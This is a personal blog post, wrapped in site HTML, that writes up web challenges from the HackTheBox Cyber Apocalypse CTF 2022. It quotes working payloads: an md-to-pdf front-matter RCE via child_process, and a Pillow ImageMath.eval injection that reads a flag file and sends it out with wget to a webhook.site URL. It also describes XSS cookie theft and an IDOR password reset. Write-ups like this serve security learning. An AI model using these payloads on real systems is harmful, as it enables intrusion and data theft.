@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Cyber Apocalypse CTF 2022</title>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+<link rel="stylesheet" href="/application.6053c2440fb32ef2010c84f629a987aa593a9a7ff9a82643ef43d9bbe9096d92.css" integrity="sha256-YFPCRA&#43;zLvIBDIT2KamHqlk6mn/5qCZD70PZu&#43;kJbZI=" />
+
+
+
+
+
+<meta property="og:url" content="https://example.org/posts/htbctf2022/">
+  <meta property="og:site_name" content="Crystal&#39;s Portfolio Page">
+  <meta property="og:title" content="Cyber Apocalypse CTF 2022">
+  <meta property="og:description" content="Cyber Apocalypse CTF 2022">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-05-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-05-23T00:00:00+00:00">
+
+    <meta name="twitter:card" content="summary"><meta name="twitter:title" content="Cyber Apocalypse CTF 2022">
+<meta name="twitter:description" content="Cyber Apocalypse CTF 2022">
+
+    
+    
+<meta name="description" content="Cyber Apocalypse CTF 2022" />
+
+
+    
+
+    
+        
+        
+        
+
+        
+        
+
+        
+	
+		
+			<script data-goatcounter="https://lsoaw.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
+    		
+        
+
+        
+        
+
+        
+        
+    
+
+
+
+
+<script>
+      theme = localStorage.getItem('darkmode:color-scheme') || 'system';
+      if (theme == 'system') {
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          theme = 'dark';
+        } else {
+          theme = 'light';
+        }
+      }
+      document.documentElement.setAttribute('data-theme', theme);
+    </script>
+  </head>
+
+  <body class="type-posts kind-page" data-spy="scroll" data-target="#TableOfContents" data-offset="80">
+    <div class="container-fluid bg-secondary wrapper">
+      
+      
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+  
+  
+    
+  
+  
+
+
+
+  
+  
+    
+  
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<nav class="navbar navbar-expand-xl top-navbar shadow " id="top-navbar">
+  <div class="container">
+    
+    <button class="navbar-toggler navbar-light" id="sidebar-toggler" type="button">
+      <i data-feather="sidebar"></i>
+    </button>
+    
+    <a class="navbar-brand" href="/">
+      
+        <img src="/images/site/main-logo_hu9df2ac3b5d10077ba06959afc947cddc_1649_42x0_resize_box_3.png" id="logo" alt="Logo">
+      Crystal&#39;s Portfolio Page</a>
+    <button
+      class="navbar-toggler navbar-light"
+      id="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#top-nav-items"
+      aria-label="menu"
+    >
+      <i data-feather="menu"></i>
+    </button>
+
+    <div class="collapse navbar-collapse dynamic-navbar" id="top-nav-items">
+      <ul class="nav navbar-nav ml-auto">
+        <li class="nav-item">
+          <a class="nav-link" href="/#home">Home</a>
+        </li>
+        
+          
+          
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#about">About</a>
+                </li>
+              
+            
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#skills">Skills</a>
+                </li>
+              
+            
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#experiences">Experiences</a>
+                </li>
+              
+            
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#education">Education</a>
+                </li>
+              
+            
+            
+              
+              
+            
+            
+              
+              
+            
+            
+              
+              
+            
+            
+          
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">More</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                
+                  
+                    
+                    
+                  
+                  
+                    
+                    
+                  
+                  
+                    
+                    
+                  
+                  
+                    
+                    
+                  
+                  
+                    
+                    
+                      <a class="dropdown-item" href="/#recent-posts">Recent Posts</a>
+                    
+                  
+                  
+                    
+                    
+                      <a class="dropdown-item" href="/#projects">Projects</a>
+                    
+                  
+                  
+                    
+                    
+                      <a class="dropdown-item" href="/#accomplishments">Accomplishments</a>
+                    
+                  
+                  
+              </div>
+            </li>
+          
+        
+        
+          <div id="top-navbar-divider"></div>
+        
+        
+          <li class="nav-item">
+            <a class="nav-link" id="blog-link" href="/posts">Posts</a>
+          </li>
+        
+        
+          <li class="nav-item">
+            <a class="nav-link" id="note-link" href="/notes">Notes</a>
+          </li>
+        
+        
+        
+        
+          <li class="nav-item dropdown">
+<a class="nav-link dropdown-toggle"  href="#" id="themeSelector" role="button"
+  data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+  <img id="navbar-theme-icon-svg" class="theme-icon" src="/icons/moon-svgrepo-com.svg" width=20 alt="Dark Theme">
+</a>
+<div id="themeMenu" class="dropdown-menu dropdown-menu-icons-only" aria-labelledby="themeSelector">
+  <a class="dropdown-item nav-link" href="#" data-scheme="light">
+    <img class="theme-icon" src="/icons/sun-svgrepo-com.svg" width=20 alt="Light Theme">
+  </a>
+  <a class="dropdown-item nav-link" href="#" data-scheme="dark">
+    <img class="theme-icon" src="/icons/moon-svgrepo-com.svg" width=20 alt="Dark Theme">
+  </a>
+  <a class="dropdown-item nav-link" href="#" data-scheme="system">
+    <img class="theme-icon" src="/icons/computer-svgrepo-com.svg" width=20 alt="System Theme">
+  </a>
+</div>
+</li>
+
+        
+      </ul>
+    </div>
+  </div>
+  
+  
+    <img src="/images/site/main-logo_hu9df2ac3b5d10077ba06959afc947cddc_1649_42x0_resize_box_3.png" class="d-none" id="main-logo" alt="Logo">
+  
+  
+    <img src="/images/site/inverted-logo_hu16507d0a1a268223a19d2a540dec58be_1607_42x0_resize_box_3.png" class="d-none" id="inverted-logo" alt="Inverted Logo">
+  
+</nav>
+
+
+
+      
+      
+  <section class="sidebar-section" id="sidebar-section">
+    <div class="sidebar-holder">
+      <div class="sidebar" id="sidebar">
+        <form class="mx-auto" method="get" action="/search">
+          <input type="text" name="keyword" value="" placeholder="Search" data-search="" id="search-box" />
+        </form>
+        <div class="sidebar-tree">
+          <ul class="tree" id="tree">
+            <li id="list-heading"><a href="/posts/" data-filter="all">Posts</a></li>
+            <div class="subtree">
+                
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/website-guide/" title="Build your own Hugo website">Build your own Hugo website</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/owasp-juice-shop-walkthrough/" title="OWASP Juice Shop Walkthrough">OWASP Juice Shop Walkthrough</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/adlab/" title="Setting up an Active Directory Lab">Setting up an Active Directory Lab</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/openwrt/" title="OpenWrt on Raspberry Pi 3b">OpenWrt on Raspberry Pi 3b</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/kasm/" title="Kasm Workspaces">Kasm Workspaces</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/htb-forge/" title="HTB: Writeup — Forge">HTB: Writeup — Forge</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/beginnerbb/" title="Beginner Bug Bounty Journey">Beginner Bug Bounty Journey</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/onemonthbb/" title="One Month Bug Bounty Journey Update">One Month Bug Bounty Journey Update</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/bbprivateinvites/" title="Bug Bounty: How to get private invites">Bug Bounty: How to get private invites</a></li>
+  
+
+  
+  
+  
+  
+    
+    
+  
+  
+    
+    <li><a class="active list-link" href="/posts/htbctf2022/" title="Cyber Apocalypse CTF 2022">Cyber Apocalypse CTF 2022</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/htb-pandora/" title="HTB: Writeup — Pandora">HTB: Writeup — Pandora</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/bb-phpinfo/" title="Bug Bounty: A tale of credentials listed on phpinfo">Bug Bounty: A tale of credentials listed on phpinfo</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/bb-pathtraversal/" title="Bug Bounty: Path Traversal in Snap Creek Duplicator plugin before 1.3.28 for WordPress">Bug Bounty: Path Traversal in Snap Creek Duplicator plugin before 1.3.28 for WordPress</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/ollama3installation/" title="Installing and running llama3 locally&#34;">Installing and running llama3 locally&#34;</a></li>
+  
+
+
+            </div>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+      
+      
+<section class="content-section" id="content-section">
+  <div class="content">
+    <div class="container p-0 read-area">
+      
+      <div class="hero-area col-sm-12" id="hero-area" style='background-image: url(/posts/htbctf2022/hero.png);'>
+      </div>
+
+      
+      <div class="page-content">
+        
+        <div class="author-profile ml-auto align-self-lg-center">
+          <img class="rounded-circle" src='/images/author/crystal_hu56daec2eff645d56fb53cd8db157a676_63575_120x120_fit_q75_box.jpg' alt="Author Image">
+          <h5 class="author-name">Crystal Mercier</h5>
+          <p class="text-muted">Monday, May 23, 2022</p>
+        </div>
+        
+        
+        <div class="title">
+          <h1>Cyber Apocalypse CTF 2022</h1>
+        </div>
+
+        
+
+        
+        <div class="post-content" id="post-content">
+          <h2 id="intro">Intro</h2>
+<p>I have decided to write on my experience at this years HackTheBox CTF event. Apologies for the short writeups. They were taking from the mess of notes and whatever screenshots I had taken to share with the group for discussion. I didn’t plan ahead to write a post about it after so learning better note keeping is definitely going on the list!</p>
+<h2 id="kryptos-support">Kryptos Support</h2>
+<p>For this task we were simply given a page saying “Report any issues regarding the Kryptos Vault below” and an input field similar to a reporting system where after submission the admin checks our report.</p>
+<p>Immediately XSS came to mind and I submitted a request that would send the cookie to my <a href="https://webhook.site/" target="_blank" rel="noopener">https://webhook.site/</a> link if it didn’t have security in place to stop the cookie from being sent. Easily enough the cookie was sent to the webhook.site link I supplied and I used this to gain access to the sites /tickets page.</p>
+<p><img alt="20220523130527770" src="/posts/htbctf2022/img-paste-20220523130527770.png"></p>
+<p>This is where I first got stuck. We are given serials for the vaults but if we make a request asking for a new rfid how do we intercept the admins reply?</p>
+<p>After giving up on trying to discover a way to intercept a request over XSS I explored some more and found a password reset function at /setting. Intercepting this with Burp reveled there was two fields required, “password” and “uid”. As in most cases the first id given on a system will belong to the admin I tried changing the uid to 1 and was successfully able to login as admin!</p>
+<p><img alt="20220523130712731" src="/posts/htbctf2022/img-paste-20220523130712731.png"></p>
+<p>This was all that was required to achieve the flag.</p>
+<h2 id="blinkerfluids">Blinkerfluids</h2>
+<p>For this one we were given the option to download the docker file. I downloaded the file while starting up the instance and had a quick look through it to see what I would be dealing with.</p>
+<p>In one file the dependencies were listed.</p>
+<pre tabindex="0"><code>&#34;dependencies&#34;: {
+&#34;express&#34;: &#34;4.17.3&#34;,
+&#34;md-to-pdf&#34;: &#34;4.1.0&#34;,
+&#34;nunjucks&#34;: &#34;3.2.3&#34;,
+&#34;sqlite-async&#34;: &#34;1.1.3&#34;,
+&#34;uuid&#34;: &#34;8.3.2&#34;
+</code></pre><p>So I immediately did a google search on each of these to see what the newest versions were. Then did a google search on any that were not at latest versions. This brought me to a vulnerability in md-to-pdf:</p>
+<p><a href="https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880" target="_blank" rel="noopener">https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880</a></p>
+<p>I had to do a bit of research into JavaScript Front Matter to understand the payload and how I would need to use it on the site. Afterward I intercepted a request from /api/invoice/add and played around with the payload and worked with a team member to find one that worked:</p>
+<p><code>--js\n((require('child_process')).execSync('id &gt; /tmp/RCE.txt'))\n---RCE</code></p>
+<p>From there we simply had to change id to ls and locate the flag!</p>
+<h2 id="amidst-us">Amidst Us</h2>
+<p>This one turned out to be a simple and cute site with the ability to upload images that replace the two sus peeps on the page. This makes a post request to /api/alphafy that looks like <code>{ “image”:”iVBORw...ElFTkSuQmCC” ,”background”:[ 255, 255, 255 ] }</code></p>
+<p>After downloading the docker image and having a look through the use of ImageMath.eval stands out to the group as it has a known vulnerability, CVE-2022-22817. <a href="https://www.cvedetails.com/cve/CVE-2022-22817/" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2022-22817/</a></p>
+<p>This allowed us to use the payload <code>&quot;exec('import os;os.system(\&quot;flag=$(cat ../flag.txt);wget https://webhook.site/webhook_uuid?flag=${flag}\&quot;)')&quot;</code> in any of the <code>background</code> parameters to get the flag.</p>
+<h2 id="mutation-lab">Mutation Lab</h2>
+<p>This challenge was using the convert-svg-to-png nodejs package which with a little googling reveled it had a known vulnerability CVE-2021-23631. <a href="https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGTOPNG-2348244" target="_blank" rel="noopener">https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGTOPNG-2348244</a>. With this POC I sent the request to /api/export over to repeater and played around.</p>
+<p><img alt="20220523131416470" src="/posts/htbctf2022/img-paste-20220523131416470.png"></p>
+<p><img alt="20220523131507969" src="/posts/htbctf2022/img-paste-20220523131507969.png"></p>
+<p>This was an immediate success but not an easy win. As a lengthy and somewhat blind search of the system reveled no flag to find. I went back to the other challenge dockers and used them to figure out some of the paths and files for this web app and read through the code on each many times trying to figure out what to do next.</p>
+<p>Eventually I came across /app.env which gave me the SESSION_SECRET_KEY.</p>
+<p><img alt="20220523131637230" src="/posts/htbctf2022/img-paste-20220523131637230.png"></p>
+<p>Unfortunately I did not know how to write code to get the admin cookie from this so I was stuck there.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I was able to see how much further I have come from last years attempt at this event. I was quite new to CTF events and felt like I didn’t know enough to join a group. This year I had enough confidence to join a group. Sadly it only ended up having 4 of the 10 people allowed and 2 of those gave up and went silent after the first day. But even having one other to work with and bounce thoughts back and forth was such a better experience!</p>
+<p>I am happy with how quickly I was able to recognize where the vulnerabilities likely were and what we were meant to do to achieve the flag. It thought me that I have much to learn with actually exploiting the vulnerabilities so I don’t give up the obvious direction too quickly and waste too much time looking for possible alternatives instead.</p>
+<p>I look forward to spending more time learning on HackTheBox machines now after I finish this sub with PentesterLab, as I now believe there is much more I can learn there and that I am ready to step a little away from the more hand held platforms.</p>
+
+        </div>
+
+        
+        <div class="row pl-3 pr-3">
+        
+          <div class="col-md-6 share-buttons">
+          
+          </div>
+
+        
+        
+          
+            
+          
+          <div class="col-md-6 btn-improve-page">
+             
+               <a href="https://cmmercier.github.io//edit/main/content/posts/HTBCTF2022/index.md" title="Improve this page" target="_blank" rel="noopener">
+            
+                <i class="fas fa-code-branch"></i>
+                Improve this page
+              </a>
+          </div>
+        
+        </div>
+
+
+
+      
+      <hr />
+        
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+    
+    
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+
+<div class="row next-prev-navigator">
+  
+    <div class="col-md-6 previous-article">
+      <a href="/posts/bbprivateinvites/" title="Bug Bounty: How to get private invites" class="btn filled-button">
+        <div><i class="fas fa-chevron-circle-left"></i> Prev</div>
+        <div class="next-prev-text">Bug Bounty: How to get private invites</div>
+      </a>
+    </div>
+  
+  
+      
+      
+        
+      
+      <div class="col-md-6 next-article">
+        <a href="/posts/htb-pandora/" title="HTB: Writeup — Pandora" class="btn filled-button">
+          <div>Next <i class="fas fa-chevron-circle-right"></i></div>
+          <div class="next-prev-text">HTB: Writeup — Pandora</div>
+        </a>
+      </div>
+    
+</div>
+
+      <hr />
+
+      
+      
+
+      
+      
+
+      </div>
+    </div>
+  </div>
+  
+  <a id="scroll-to-top" class="btn"  data-toggle="tooltip" data-placement="left" title="Scroll to top">
+    <i class="fas fa-chevron-circle-up"></i>
+  </a>
+</section>
+
+
+      
+      
+  <section class="toc-section" id="toc-section">
+    
+    <div class="toc-holder">
+      <h5 class="text-center pl-3">Table of Contents</h5>
+      <hr>
+      <div class="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#kryptos-support">Kryptos Support</a></li>
+    <li><a href="#blinkerfluids">Blinkerfluids</a></li>
+    <li><a href="#amidst-us">Amidst Us</a></li>
+    <li><a href="#mutation-lab">Mutation Lab</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+      </div>
+    </div>
+    
+  </section>
+
+    </div>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+  
+
+  
+  
+    
+    
+      
+    
+  
+
+
+  
+  
+  
+
+  
+  
+  
+
+  
+  
+  
+    
+  
+  
+
+  
+  
+  
+
+  <footer id="footer" class="container-fluid text-center align-content-center footer pb-2">
+    <div class="container pt-5">
+      <div class="row text-left">
+        
+        <div class="col-md-4 col-sm-12">
+          <h5>Navigation</h5>
+          
+          <ul>
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://example.org/#about">About</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://example.org/#skills">Skills</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://example.org/#experiences">Experiences</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://example.org/#education">Education</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://example.org/#recent-posts">Recent Posts</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://example.org/#projects">Projects</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="https://example.org/#accomplishments">Accomplishments</a>
+                </li>
+              
+              
+            
+              
+            
+          </ul>
+          
+        </div>
+        
+        
+        <div class="col-md-4 col-sm-12">
+          <h5>Contact me:</h5>
+          <ul>
+            
+              
+                <li><a href=mailto:cmmercier86@gmail.com target="_blank" rel="noopener">
+                  <span><i class="fas fa-envelope"></i></span> <span>cmmercier86@gmail.com</span>
+                </a></li>
+              
+            
+              
+                <li><a href=https://github.com/CMMercier target="_blank" rel="noopener">
+                  <span><i class="fab fa-github"></i></span> <span>CMMercier</span>
+                </a></li>
+              
+            
+              
+                <li><a href=https://www.linkedin.com/in/crystalmercier target="_blank" rel="noopener">
+                  <span><i class="fab fa-linkedin"></i></span> <span>Crystal Mercier</span>
+                </a></li>
+              
+            
+          </ul>
+        </div>
+        
+        
+        
+          
+          <div class="col-md-4 col-sm-12">
+            <p>Stay up to date with email notification</p>
+            
+              <form method='post' action='https://blogtrottr.com'>
+              <div class="form-group">
+              <input type='email' class="form-control" name='btr_email' placeholder="Enter email"/><br />
+              <input type='hidden' name='btr_url' value='https://example.org//index.xml' />
+              <input type='hidden' name='schedule_type' value='1' />
+              <small id="emailHelp" class="form-text text-muted">By entering your email address, you agree to receive the newsletter of this website.</small>
+              <button type="submit" class="btn btn-info"> Submit </button>
+              </div>
+              </form>
+            
+          </div>
+        
+      </div>
+    </div>
+    
+    
+    <hr />
+    <div class="container">
+      <div class="row text-left">
+        <div class="col-md-4">
+          <a id="theme" href="https://github.com/hugo-toha/toha" target="_blank" rel="noopener">
+            <img src="/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png" alt="Toha Theme Logo">
+            Toha
+          </a>
+        </div>
+        <div class="col-md-4 text-center">© 2024 Copyright.</div>
+        <div class="col-md-4 text-right">
+          <a id="hugo" href="https://gohugo.io/" target="_blank" rel="noopener">Powered by
+          <img
+            src="/images/hugo-logo.svg"
+            alt="Hugo Logo"
+            height="18"
+          />
+          </a>
+        </div>
+      </div>
+    </div>
+    
+  </footer>
+
+
+    <script src="/application.b8c95b66a01e532235142adb23f68467c46f29b4d385c0fed7d751dcb1e824be.js" integrity="sha256-uMlbZqAeUyI1FCrbI/aEZ8RvKbTThcD&#43;19dR3LHoJL4=" defer></script>
+
+
+    
+     
+
+    
+    
+
+</body>
+</html>
